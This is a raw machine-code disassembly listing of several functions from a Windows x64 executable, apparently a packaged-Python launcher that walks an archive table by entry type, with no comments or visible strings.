   140002d4a:	41 b9 00 04 00 00    	mov    $0x400,%r9d
   140002d50:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140002d54:	45 8b c4             	mov    %r12d,%r8d
   140002d57:	33 d2                	xor    %edx,%edx
   140002d59:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002d5e:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140002d63:	ff 15 5f 83 02 00    	call   *0x2835f(%rip)        # 0x14002b0c8
   140002d69:	85 c0                	test   %eax,%eax
   140002d6b:	75 12                	jne    0x140002d7f
   140002d6d:	48 63 d7             	movslq %edi,%rdx
   140002d70:	4c 8d 05 39 8f 02 00 	lea    0x28f39(%rip),%r8        # 0x14002bcb0
   140002d77:	48 8b ce             	mov    %rsi,%rcx
   140002d7a:	e8 31 f9 ff ff       	call   0x1400026b0
   140002d7f:	8b c5                	mov    %ebp,%eax
   140002d81:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140002d86:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140002d8c:	4c 8d 05 a5 8f 02 00 	lea    0x28fa5(%rip),%r8        # 0x14002bd38
   140002d93:	33 c9                	xor    %ecx,%ecx
   140002d95:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   140002d99:	ff 15 79 86 02 00    	call   *0x28679(%rip)        # 0x14002b418
   140002d9f:	48 8b 8c 24 40 20 00 	mov    0x2040(%rsp),%rcx
   140002da6:	00 
   140002da7:	48 33 cc             	xor    %rsp,%rcx
   140002daa:	e8 a1 97 00 00       	call   0x14000c550
   140002daf:	48 81 c4 58 20 00 00 	add    $0x2058,%rsp
   140002db6:	41 5f                	pop    %r15
   140002db8:	41 5e                	pop    %r14
   140002dba:	41 5d                	pop    %r13
   140002dbc:	41 5c                	pop    %r12
   140002dbe:	5f                   	pop    %rdi
   140002dbf:	5e                   	pop    %rsi
   140002dc0:	5d                   	pop    %rbp
   140002dc1:	5b                   	pop    %rbx
   140002dc2:	c3                   	ret
   140002dc3:	cc                   	int3
   140002dc4:	cc                   	int3
   140002dc5:	cc                   	int3
   140002dc6:	cc                   	int3
   140002dc7:	cc                   	int3
   140002dc8:	cc                   	int3
   140002dc9:	cc                   	int3
   140002dca:	cc                   	int3
   140002dcb:	cc                   	int3
   140002dcc:	cc                   	int3
   140002dcd:	cc                   	int3
   140002dce:	cc                   	int3
   140002dcf:	cc                   	int3
   140002dd0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002dd5:	56                   	push   %rsi
   140002dd6:	57                   	push   %rdi
   140002dd7:	41 55                	push   %r13
   140002dd9:	41 56                	push   %r14
   140002ddb:	41 57                	push   %r15
   140002ddd:	48 83 ec 30          	sub    $0x30,%rsp
   140002de1:	48 8b 05 58 f0 03 00 	mov    0x3f058(%rip),%rax        # 0x140041e40
   140002de8:	4c 8b f9             	mov    %rcx,%r15
   140002deb:	48 8d 0d 2e 90 02 00 	lea    0x2902e(%rip),%rcx        # 0x14002be20
   140002df2:	41 8b f9             	mov    %r9d,%edi
   140002df5:	49 8b d8             	mov    %r8,%rbx
   140002df8:	48 8b f2             	mov    %rdx,%rsi
   140002dfb:	45 33 f6             	xor    %r14d,%r14d
   140002dfe:	ff 15 ac 86 02 00    	call   *0x286ac(%rip)        # 0x14002b4b0
   140002e04:	4c 8b e8             	mov    %rax,%r13
   140002e07:	48 85 c0             	test   %rax,%rax
   140002e0a:	0f 84 9c 01 00 00    	je     0x140002fac
   140002e10:	48 8b c8             	mov    %rax,%rcx
   140002e13:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   140002e18:	48 8b 05 51 f0 03 00 	mov    0x3f051(%rip),%rax        # 0x140041e70
   140002e1f:	48 8d 15 0a 90 02 00 	lea    0x2900a(%rip),%rdx        # 0x14002be30
   140002e26:	ff 15 84 86 02 00    	call   *0x28684(%rip)        # 0x14002b4b0
   140002e2c:	4c 8b e0             	mov    %rax,%r12
   140002e2f:	48 85 c0             	test   %rax,%rax
   140002e32:	0f 84 5f 01 00 00    	je     0x140002f97
   140002e38:	48 8b c8             	mov    %rax,%rcx
   140002e3b:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   140002e40:	48 8b 05 21 f0 03 00 	mov    0x3f021(%rip),%rax        # 0x140041e68
   140002e47:	4c 8b cb             	mov    %rbx,%r9
   140002e4a:	4c 8b c6             	mov    %rsi,%r8
   140002e4d:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002e52:	49 8b d7             	mov    %r15,%rdx
   140002e55:	41 8b ee             	mov    %r14d,%ebp
   140002e58:	ff 15 52 86 02 00    	call   *0x28652(%rip)        # 0x14002b4b0
   140002e5e:	4c 8b f8             	mov    %rax,%r15
   140002e61:	48 85 c0             	test   %rax,%rax
   140002e64:	0f 84 08 01 00 00    	je     0x140002f72
   140002e6a:	85 ff                	test   %edi,%edi
   140002e6c:	75 18                	jne    0x140002e86
   140002e6e:	48 8b c8             	mov    %rax,%rcx
   140002e71:	48 8b 05 08 f0 03 00 	mov    0x3f008(%rip),%rax        # 0x140041e80
   140002e78:	ff 15 32 86 02 00    	call   *0x28632(%rip)        # 0x14002b4b0
   140002e7e:	48 8b e8             	mov    %rax,%rbp
   140002e81:	e9 c7 00 00 00       	jmp    0x140002f4d
   140002e86:	48 8b 05 43 f0 03 00 	mov    0x3f043(%rip),%rax        # 0x140041ed0
   140002e8d:	48 8d 0d ad 8f 02 00 	lea    0x28fad(%rip),%rcx        # 0x14002be41
   140002e94:	ff 15 16 86 02 00    	call   *0x28616(%rip)        # 0x14002b4b0
   140002e9a:	48 8b d8             	mov    %rax,%rbx
   140002e9d:	48 8b c8             	mov    %rax,%rcx
   140002ea0:	48 8b 05 31 f0 03 00 	mov    0x3f031(%rip),%rax        # 0x140041ed8
   140002ea7:	49 8b d7             	mov    %r15,%rdx
   140002eaa:	ff 15 00 86 02 00    	call   *0x28600(%rip)        # 0x14002b4b0
   140002eb0:	48 8b e8             	mov    %rax,%rbp
   140002eb3:	48 8b cb             	mov    %rbx,%rcx
   140002eb6:	48 8b 05 d3 ee 03 00 	mov    0x3eed3(%rip),%rax        # 0x140041d90
   140002ebd:	ff 15 ed 85 02 00    	call   *0x285ed(%rip)        # 0x14002b4b0
   140002ec3:	83 ff 02             	cmp    $0x2,%edi
   140002ec6:	0f 85 81 00 00 00    	jne    0x140002f4d
   140002ecc:	48 8b 05 fd ef 03 00 	mov    0x3effd(%rip),%rax        # 0x140041ed0
   140002ed3:	48 8d 0d 6a 8f 02 00 	lea    0x28f6a(%rip),%rcx        # 0x14002be44
   140002eda:	ff 15 d0 85 02 00    	call   *0x285d0(%rip)        # 0x14002b4b0
   140002ee0:	48 8b f0             	mov    %rax,%rsi
   140002ee3:	48 8d 0d 5e 8f 02 00 	lea    0x28f5e(%rip),%rcx        # 0x14002be48
   140002eea:	48 8b 05 df ef 03 00 	mov    0x3efdf(%rip),%rax        # 0x140041ed0
   140002ef1:	ff 15 b9 85 02 00    	call   *0x285b9(%rip)        # 0x14002b4b0
   140002ef7:	49 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%r9
   140002efe:	48 8b d6             	mov    %rsi,%rdx
   140002f01:	48 8b f8             	mov    %rax,%rdi
   140002f04:	4c 8b c0             	mov    %rax,%r8
   140002f07:	48 8b 05 d2 ef 03 00 	mov    0x3efd2(%rip),%rax        # 0x140041ee0
   140002f0e:	48 8b cd             	mov    %rbp,%rcx
   140002f11:	ff 15 99 85 02 00    	call   *0x28599(%rip)        # 0x14002b4b0
   140002f17:	48 8b d8             	mov    %rax,%rbx
   140002f1a:	48 8b ce             	mov    %rsi,%rcx
   140002f1d:	48 8b 05 6c ee 03 00 	mov    0x3ee6c(%rip),%rax        # 0x140041d90
   140002f24:	ff 15 86 85 02 00    	call   *0x28586(%rip)        # 0x14002b4b0
   140002f2a:	48 8b 05 5f ee 03 00 	mov    0x3ee5f(%rip),%rax        # 0x140041d90
   140002f31:	48 8b cf             	mov    %rdi,%rcx
   140002f34:	ff 15 76 85 02 00    	call   *0x28576(%rip)        # 0x14002b4b0
   140002f3a:	48 8b 05 4f ee 03 00 	mov    0x3ee4f(%rip),%rax        # 0x140041d90
   140002f41:	48 8b cd             	mov    %rbp,%rcx
   140002f44:	ff 15 66 85 02 00    	call   *0x28566(%rip)        # 0x14002b4b0
   140002f4a:	48 8b eb             	mov    %rbx,%rbp
   140002f4d:	48 85 ed             	test   %rbp,%rbp
   140002f50:	74 20                	je     0x140002f72
   140002f52:	48 8b 05 57 ef 03 00 	mov    0x3ef57(%rip),%rax        # 0x140041eb0
   140002f59:	48 8b cd             	mov    %rbp,%rcx
   140002f5c:	ff 15 4e 85 02 00    	call   *0x2854e(%rip)        # 0x14002b4b0
   140002f62:	48 85 c0             	test   %rax,%rax
   140002f65:	74 0b                	je     0x140002f72
   140002f67:	48 8b c8             	mov    %rax,%rcx
   140002f6a:	e8 95 74 01 00       	call   0x14001a404
   140002f6f:	4c 8b f0             	mov    %rax,%r14
   140002f72:	48 8b 05 17 ee 03 00 	mov    0x3ee17(%rip),%rax        # 0x140041d90
   140002f79:	49 8b cf             	mov    %r15,%rcx
   140002f7c:	ff 15 2e 85 02 00    	call   *0x2852e(%rip)        # 0x14002b4b0
   140002f82:	48 8b 05 07 ee 03 00 	mov    0x3ee07(%rip),%rax        # 0x140041d90
   140002f89:	48 8b cd             	mov    %rbp,%rcx
   140002f8c:	ff 15 1e 85 02 00    	call   *0x2851e(%rip)        # 0x14002b4b0
   140002f92:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   140002f97:	48 8b 05 f2 ed 03 00 	mov    0x3edf2(%rip),%rax        # 0x140041d90
   140002f9e:	49 8b cc             	mov    %r12,%rcx
   140002fa1:	ff 15 09 85 02 00    	call   *0x28509(%rip)        # 0x14002b4b0
   140002fa7:	4c 8b 64 24 68       	mov    0x68(%rsp),%r12
   140002fac:	48 8b 05 dd ed 03 00 	mov    0x3eddd(%rip),%rax        # 0x140041d90
   140002fb3:	49 8b cd             	mov    %r13,%rcx
   140002fb6:	ff 15 f4 84 02 00    	call   *0x284f4(%rip)        # 0x14002b4b0
   140002fbc:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002fc1:	49 8b c6             	mov    %r14,%rax
   140002fc4:	48 83 c4 30          	add    $0x30,%rsp
   140002fc8:	41 5f                	pop    %r15
   140002fca:	41 5e                	pop    %r14
   140002fcc:	41 5d                	pop    %r13
   140002fce:	5f                   	pop    %rdi
   140002fcf:	5e                   	pop    %rsi
   140002fd0:	c3                   	ret
   140002fd1:	cc                   	int3
   140002fd2:	cc                   	int3
   140002fd3:	cc                   	int3
   140002fd4:	cc                   	int3
   140002fd5:	cc                   	int3
   140002fd6:	cc                   	int3
   140002fd7:	cc                   	int3
   140002fd8:	cc                   	int3
   140002fd9:	cc                   	int3
   140002fda:	cc                   	int3
   140002fdb:	cc                   	int3
   140002fdc:	cc                   	int3
   140002fdd:	cc                   	int3
   140002fde:	cc                   	int3
   140002fdf:	cc                   	int3
   140002fe0:	40 56                	rex push %rsi
   140002fe2:	41 55                	push   %r13
   140002fe4:	41 57                	push   %r15
   140002fe6:	b8 70 10 00 00       	mov    $0x1070,%eax
   140002feb:	e8 60 98 00 00       	call   0x14000c850
   140002ff0:	48 2b e0             	sub    %rax,%rsp
   140002ff3:	48 8b 05 46 b0 03 00 	mov    0x3b046(%rip),%rax        # 0x14003e040
   140002ffa:	48 33 c4             	xor    %rsp,%rax
   140002ffd:	48 89 84 24 50 10 00 	mov    %rax,0x1050(%rsp)
   140003004:	00 
   140003005:	48 8b b1 10 20 00 00 	mov    0x2010(%rcx),%rsi
   14000300c:	4c 8b e9             	mov    %rcx,%r13
   14000300f:	48 8b 05 1a ee 03 00 	mov    0x3ee1a(%rip),%rax        # 0x140041e30
   140003016:	48 8d 0d 33 8e 02 00 	lea    0x28e33(%rip),%rcx        # 0x14002be50
   14000301d:	ff 15 8d 84 02 00    	call   *0x2848d(%rip)        # 0x14002b4b0
   140003023:	4c 8b f8             	mov    %rax,%r15
   140003026:	48 85 c0             	test   %rax,%rax
   140003029:	75 16                	jne    0x140003041
   14000302b:	48 8d 0d 2e 8e 02 00 	lea    0x28e2e(%rip),%rcx        # 0x14002be60
   140003032:	e8 d9 f6 ff ff       	call   0x140002710
   140003037:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000303c:	e9 a9 01 00 00       	jmp    0x1400031ea
   140003041:	48 8b 05 10 ee 03 00 	mov    0x3ee10(%rip),%rax        # 0x140041e58
   140003048:	49 8b cf             	mov    %r15,%rcx
   14000304b:	4c 89 a4 24 68 10 00 	mov    %r12,0x1068(%rsp)
   140003052:	00 
   140003053:	ff 15 57 84 02 00    	call   *0x28457(%rip)        # 0x14002b4b0
   140003059:	4c 8b e0             	mov    %rax,%r12
   14000305c:	48 85 c0             	test   %rax,%rax
   14000305f:	75 16                	jne    0x140003077
   140003061:	48 8d 0d 18 8e 02 00 	lea    0x28e18(%rip),%rcx        # 0x14002be80
   140003068:	e8 a3 f6 ff ff       	call   0x140002710
   14000306d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003072:	e9 6b 01 00 00       	jmp    0x1400031e2
   140003077:	48 89 9c 24 98 10 00 	mov    %rbx,0x1098(%rsp)
   14000307e:	00 
   14000307f:	48 8b 9e 08 10 00 00 	mov    0x1008(%rsi),%rbx
   140003086:	48 89 ac 24 a0 10 00 	mov    %rbp,0x10a0(%rsp)
   14000308d:	00 
   14000308e:	48 89 bc 24 a8 10 00 	mov    %rdi,0x10a8(%rsp)
   140003095:	00 
   140003096:	4c 89 b4 24 60 10 00 	mov    %r14,0x1060(%rsp)
   14000309d:	00 
   14000309e:	48 3b 9e 10 10 00 00 	cmp    0x1010(%rsi),%rbx
   1400030a5:	0f 83 15 01 00 00    	jae    0x1400031c0
   1400030ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400030b0:	80 7b 11 73          	cmpb   $0x73,0x11(%rbx)
   1400030b4:	0f 85 eb 00 00 00    	jne    0x1400031a5
   1400030ba:	48 8b d3             	mov    %rbx,%rdx
   1400030bd:	48 8b ce             	mov    %rsi,%rcx
   1400030c0:	e8 ab e3 ff ff       	call   0x140001470
   1400030c5:	48 8b e8             	mov    %rax,%rbp
   1400030c8:	48 85 c0             	test   %rax,%rax
   1400030cb:	0f 84 78 02 00 00    	je     0x140003349
   1400030d1:	4c 8d 73 12          	lea    0x12(%rbx),%r14
   1400030d5:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400030da:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   1400030df:	4d 8d 8d 22 20 00 00 	lea    0x2022(%r13),%r9
   1400030e6:	4c 8d 05 e3 8d 02 00 	lea    0x28de3(%rip),%r8        # 0x14002bed0
   1400030ed:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   1400030f4:	00 
   1400030f5:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400030fa:	e8 81 eb ff ff       	call   0x140001c80
   1400030ff:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140003104:	0f 8d 29 02 00 00    	jge    0x140003333
   14000310a:	48 8b 05 bf ed 03 00 	mov    0x3edbf(%rip),%rax        # 0x140041ed0
   140003111:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003116:	ff 15 94 83 02 00    	call   *0x28394(%rip)        # 0x14002b4b0
   14000311c:	48 8d 15 ed 8d 02 00 	lea    0x28ded(%rip),%rdx        # 0x14002bf10
   140003123:	49 8b cf             	mov    %r15,%rcx
   140003126:	48 8b f8             	mov    %rax,%rdi
   140003129:	4c 8b c0             	mov    %rax,%r8
   14000312c:	48 8b 05 45 ed 03 00 	mov    0x3ed45(%rip),%rax        # 0x140041e78
   140003133:	ff 15 77 83 02 00    	call   *0x28377(%rip)        # 0x14002b4b0
   140003139:	48 8b 05 50 ec 03 00 	mov    0x3ec50(%rip),%rax        # 0x140041d90
   140003140:	48 8b cf             	mov    %rdi,%rcx
   140003143:	ff 15 67 83 02 00    	call   *0x28367(%rip)        # 0x14002b4b0
   140003149:	8b 53 0c             	mov    0xc(%rbx),%edx
   14000314c:	48 8b cd             	mov    %rbp,%rcx
   14000314f:	48 8b 05 f2 ec 03 00 	mov    0x3ecf2(%rip),%rax        # 0x140041e48
   140003156:	ff 15 54 83 02 00    	call   *0x28354(%rip)        # 0x14002b4b0
   14000315c:	48 8b cd             	mov    %rbp,%rcx
   14000315f:	48 8b f8             	mov    %rax,%rdi
   140003162:	e8 c9 1d 01 00       	call   0x140014f30
   140003167:	48 85 ff             	test   %rdi,%rdi
   14000316a:	0f 84 9d 01 00 00    	je     0x14000330d
   140003170:	48 8b 05 01 ed 03 00 	mov    0x3ed01(%rip),%rax        # 0x140041e78
   140003177:	48 8d 15 ca 8d 02 00 	lea    0x28dca(%rip),%rdx        # 0x14002bf48
   14000317e:	4c 8b c7             	mov    %rdi,%r8
   140003181:	49 8b cf             	mov    %r15,%rcx
   140003184:	ff 15 26 83 02 00    	call   *0x28326(%rip)        # 0x14002b4b0
   14000318a:	48 8b 05 97 ec 03 00 	mov    0x3ec97(%rip),%rax        # 0x140041e28
   140003191:	4d 8b c4             	mov    %r12,%r8
   140003194:	49 8b d4             	mov    %r12,%rdx
   140003197:	48 8b cf             	mov    %rdi,%rcx
   14000319a:	ff 15 10 83 02 00    	call   *0x28310(%rip)        # 0x14002b4b0
   1400031a0:	48 85 c0             	test   %rax,%rax
   1400031a3:	74 62                	je     0x140003207
   1400031a5:	48 8b d3             	mov    %rbx,%rdx
   1400031a8:	48 8b ce             	mov    %rsi,%rcx
   1400031ab:	e8 90 e7 ff ff       	call   0x140001940
   1400031b0:	48 8b d8             	mov    %rax,%rbx
   1400031b3:	48 3b 86 10 10 00 00 	cmp    0x1010(%rsi),%rax
   1400031ba:	0f 82 f0 fe ff ff    	jb     0x1400030b0
   1400031c0:	33 c0                	xor    %eax,%eax
   1400031c2:	48 8b 9c 24 98 10 00 	mov    0x1098(%rsp),%rbx
   1400031c9:	00 
   1400031ca:	48 8b bc 24 a8 10 00 	mov    0x10a8(%rsp),%rdi
   1400031d1:	00 
   1400031d2:	48 8b ac 24 a0 10 00 	mov    0x10a0(%rsp),%rbp
   1400031d9:	00 
   1400031da:	4c 8b b4 24 60 10 00 	mov    0x1060(%rsp),%r14
   1400031e1:	00 
   1400031e2:	4c 8b a4 24 68 10 00 	mov    0x1068(%rsp),%r12
   1400031e9:	00 
   1400031ea:	48 8b 8c 24 50 10 00 	mov    0x1050(%rsp),%rcx
   1400031f1:	00 
   1400031f2:	48 33 cc             	xor    %rsp,%rcx
   1400031f5:	e8 56 93 00 00       	call   0x14000c550
   1400031fa:	48 81 c4 70 10 00 00 	add    $0x1070,%rsp
   140003201:	41 5f                	pop    %r15
   140003203:	41 5d                	pop    %r13
   140003205:	5e                   	pop    %rsi
   140003206:	c3                   	ret
   140003207:	48 8b 05 f2 eb 03 00 	mov    0x3ebf2(%rip),%rax        # 0x140041e00
   14000320e:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003213:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003218:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000321d:	ff 15 8d 82 02 00    	call   *0x2828d(%rip)        # 0x14002b4b0
   140003223:	48 8b 05 de eb 03 00 	mov    0x3ebde(%rip),%rax        # 0x140041e08
   14000322a:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   14000322f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003234:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003239:	ff 15 71 82 02 00    	call   *0x28271(%rip)        # 0x14002b4b0
   14000323f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003244:	33 f6                	xor    %esi,%esi
   140003246:	48 8b 05 33 ec 03 00 	mov    0x3ec33(%rip),%rax        # 0x140041e80
   14000324d:	ff 15 5d 82 02 00    	call   *0x2825d(%rip)        # 0x14002b4b0
   140003253:	48 8b f8             	mov    %rax,%rdi
   140003256:	48 8b c8             	mov    %rax,%rcx
   140003259:	48 8b 05 50 ec 03 00 	mov    0x3ec50(%rip),%rax        # 0x140041eb0
   140003260:	ff 15 4a 82 02 00    	call   *0x2824a(%rip)        # 0x14002b4b0
   140003266:	48 85 c0             	test   %rax,%rax
   140003269:	74 0b                	je     0x140003276
   14000326b:	48 8b c8             	mov    %rax,%rcx
   14000326e:	e8 91 71 01 00       	call   0x14001a404
   140003273:	48 8b f0             	mov    %rax,%rsi
   140003276:	48 8b 05 13 eb 03 00 	mov    0x3eb13(%rip),%rax        # 0x140041d90
   14000327d:	48 8b cf             	mov    %rdi,%rcx
   140003280:	ff 15 2a 82 02 00    	call   *0x2822a(%rip)        # 0x14002b4b0
   140003286:	41 80 bd 78 30 00 00 	cmpb   $0x0,0x3078(%r13)
   14000328d:	00 
   14000328e:	74 0e                	je     0x14000329e
   140003290:	48 8d 0d c1 8c 02 00 	lea    0x28cc1(%rip),%rcx        # 0x14002bf58
   140003297:	e8 68 71 01 00       	call   0x14001a404
   14000329c:	eb 1a                	jmp    0x1400032b8
   14000329e:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   1400032a3:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400032a9:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   1400032ae:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400032b3:	e8 18 fb ff ff       	call   0x140002dd0
   1400032b8:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   1400032bd:	48 8b f8             	mov    %rax,%rdi
   1400032c0:	48 8b 05 59 eb 03 00 	mov    0x3eb59(%rip),%rax        # 0x140041e20
   1400032c7:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   1400032cc:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400032d1:	ff 15 d9 81 02 00    	call   *0x281d9(%rip)        # 0x14002b4b0
   1400032d7:	48 8b 05 3a eb 03 00 	mov    0x3eb3a(%rip),%rax        # 0x140041e18
   1400032de:	ff 15 cc 81 02 00    	call   *0x281cc(%rip)        # 0x14002b4b0
   1400032e4:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   1400032e8:	4c 8b c7             	mov    %rdi,%r8
   1400032eb:	48 8b d6             	mov    %rsi,%rdx
   1400032ee:	e8 0d f2 ff ff       	call   0x140002500
   1400032f3:	48 8b ce             	mov    %rsi,%rcx
   1400032f6:	e8 35 1c 01 00       	call   0x140014f30
   1400032fb:	48 8b cf             	mov    %rdi,%rcx
   1400032fe:	e8 2d 1c 01 00       	call   0x140014f30
   140003303:	b8 01 00 00 00       	mov    $0x1,%eax
   140003308:	e9 b5 fe ff ff       	jmp    0x1400031c2
   14000330d:	49 8b d6             	mov    %r14,%rdx
   140003310:	48 8d 0d 09 8c 02 00 	lea    0x28c09(%rip),%rcx        # 0x14002bf20
   140003317:	e8 f4 f3 ff ff       	call   0x140002710
   14000331c:	48 8b 05 f5 ea 03 00 	mov    0x3eaf5(%rip),%rax        # 0x140041e18
   140003323:	ff 15 87 81 02 00    	call   *0x28187(%rip)        # 0x14002b4b0
   140003329:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000332e:	e9 8f fe ff ff       	jmp    0x1400031c2
   140003333:	48 8d 0d a6 8b 02 00 	lea    0x28ba6(%rip),%rcx        # 0x14002bee0
   14000333a:	e8 d1 f3 ff ff       	call   0x140002710
   14000333f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140003344:	e9 79 fe ff ff       	jmp    0x1400031c2
   140003349:	48 8d 0d 58 8b 02 00 	lea    0x28b58(%rip),%rcx        # 0x14002bea8
   140003350:	e8 bb f3 ff ff       	call   0x140002710
   140003355:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000335a:	e9 63 fe ff ff       	jmp    0x1400031c2
   14000335f:	cc                   	int3
   140003360:	40 53                	rex push %rbx
   140003362:	48 83 ec 20          	sub    $0x20,%rsp
   140003366:	48 8b d9             	mov    %rcx,%rbx
   140003369:	e8 f2 2f 00 00       	call   0x140006360
   14000336e:	85 c0                	test   %eax,%eax
   140003370:	75 38                	jne    0x1400033aa
   140003372:	48 8b cb             	mov    %rbx,%rcx
   140003375:	c6 83 30 30 00 00 01 	movb   $0x1,0x3030(%rbx)
   14000337c:	e8 7f 31 00 00       	call   0x140006500
   140003381:	85 c0                	test   %eax,%eax
   140003383:	75 25                	jne    0x1400033aa
   140003385:	48 8b cb             	mov    %rbx,%rcx
   140003388:	e8 c3 2c 00 00       	call   0x140006050
   14000338d:	85 c0                	test   %eax,%eax
   14000338f:	75 19                	jne    0x1400033aa
   140003391:	48 8b cb             	mov    %rbx,%rcx
   140003394:	e8 47 2e 00 00       	call   0x1400061e0
   140003399:	85 c0                	test   %eax,%eax
   14000339b:	75 0d                	jne    0x1400033aa
   14000339d:	48 8b cb             	mov    %rbx,%rcx
   1400033a0:	48 83 c4 20          	add    $0x20,%rsp
   1400033a4:	5b                   	pop    %rbx
   1400033a5:	e9 36 fc ff ff       	jmp    0x140002fe0
   1400033aa:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400033af:	48 83 c4 20          	add    $0x20,%rsp
   1400033b3:	5b                   	pop    %rbx
   1400033b4:	c3                   	ret
   1400033b5:	cc                   	int3
   1400033b6:	cc                   	int3
   1400033b7:	cc                   	int3
   1400033b8:	cc                   	int3
   1400033b9:	cc                   	int3
   1400033ba:	cc                   	int3
   1400033bb:	cc                   	int3
   1400033bc:	cc                   	int3
   1400033bd:	cc                   	int3
   1400033be:	cc                   	int3
   1400033bf:	cc                   	int3
   1400033c0:	40 53                	rex push %rbx
   1400033c2:	41 56                	push   %r14
   1400033c4:	b8 f8 30 00 00       	mov    $0x30f8,%eax
   1400033c9:	e8 82 94 00 00       	call   0x14000c850
   1400033ce:	48 2b e0             	sub    %rax,%rsp
   1400033d1:	48 8b 05 68 ac 03 00 	mov    0x3ac68(%rip),%rax        # 0x14003e040
   1400033d8:	48 33 c4             	xor    %rsp,%rax
   1400033db:	48 89 84 24 d0 30 00 	mov    %rax,0x30d0(%rsp)
   1400033e2:	00 
   1400033e3:	48 89 ac 24 18 31 00 	mov    %rbp,0x3118(%rsp)
   1400033ea:	00 
   1400033eb:	45 33 f6             	xor    %r14d,%r14d
   1400033ee:	48 8b e9             	mov    %rcx,%rbp
   1400033f1:	48 89 bc 24 28 31 00 	mov    %rdi,0x3128(%rsp)
   1400033f8:	00 
   1400033f9:	4c 89 ac 24 e8 30 00 	mov    %r13,0x30e8(%rsp)
   140003400:	00 
   140003401:	33 d2                	xor    %edx,%edx
   140003403:	4c 8b a9 10 20 00 00 	mov    0x2010(%rcx),%r13
   14000340a:	41 b8 a0 00 00 00    	mov    $0xa0,%r8d
   140003410:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003415:	41 8b de             	mov    %r14d,%ebx
   140003418:	e8 b3 70 02 00       	call   0x14002a4d0
   14000341d:	49 8b bd 08 10 00 00 	mov    0x1008(%r13),%rdi
   140003424:	49 3b bd 10 10 00 00 	cmp    0x1010(%r13),%rdi
   14000342b:	0f 83 e1 01 00 00    	jae    0x140003612
   140003431:	4c 89 a4 24 f0 30 00 	mov    %r12,0x30f0(%rsp)
   140003438:	00 
   140003439:	41 bc ff ff ff ff    	mov    $0xffffffff,%r12d
   14000343f:	48 89 b4 24 20 31 00 	mov    %rsi,0x3120(%rsp)
   140003446:	00 
   140003447:	4c 89 bc 24 e0 30 00 	mov    %r15,0x30e0(%rsp)
   14000344e:	00 
   14000344f:	90                   	nop
   140003450:	0f b6 4f 11          	movzbl 0x11(%rdi),%ecx
   140003454:	8d 41 a6             	lea    -0x5a(%rcx),%eax
   140003457:	a8 f7                	test   $0xf7,%al
   140003459:	74 17                	je     0x140003472
   14000345b:	80 f9 64             	cmp    $0x64,%cl
   14000345e:	0f 84 02 01 00 00    	je     0x140003566
   140003464:	80 f9 6e             	cmp    $0x6e,%cl
   140003467:	74 09                	je     0x140003472
   140003469:	80 f9 78             	cmp    $0x78,%cl
   14000346c:	0f 85 3a 01 00 00    	jne    0x1400035ac
   140003472:	48 8d 77 12          	lea    0x12(%rdi),%rsi
   140003476:	85 db                	test   %ebx,%ebx
   140003478:	0f 85 7c 01 00 00    	jne    0x1400035fa
   14000347e:	48 8b 8d 18 20 00 00 	mov    0x2018(%rbp),%rcx
   140003485:	48 85 c9             	test   %rcx,%rcx
   140003488:	74 08                	je     0x140003492
   14000348a:	48 8b d6             	mov    %rsi,%rdx
   14000348d:	e8 5e 41 00 00       	call   0x1400075f0
   140003492:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140003497:	4c 8d 8d 22 20 00 00 	lea    0x2022(%rbp),%r9
   14000349e:	4c 8d 05 bf 88 02 00 	lea    0x288bf(%rip),%r8        # 0x14002bd64
   1400034a5:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   1400034ac:	00 
   1400034ad:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400034b2:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   1400034b9:	00 
   1400034ba:	e8 c1 e7 ff ff       	call   0x140001c80
   1400034bf:	3d 00 10 00 00       	cmp    $0x1000,%eax
   1400034c4:	0f 8d 21 01 00 00    	jge    0x1400035eb
   1400034ca:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   1400034d1:	00 
   1400034d2:	e8 89 10 00 00       	call   0x140004560
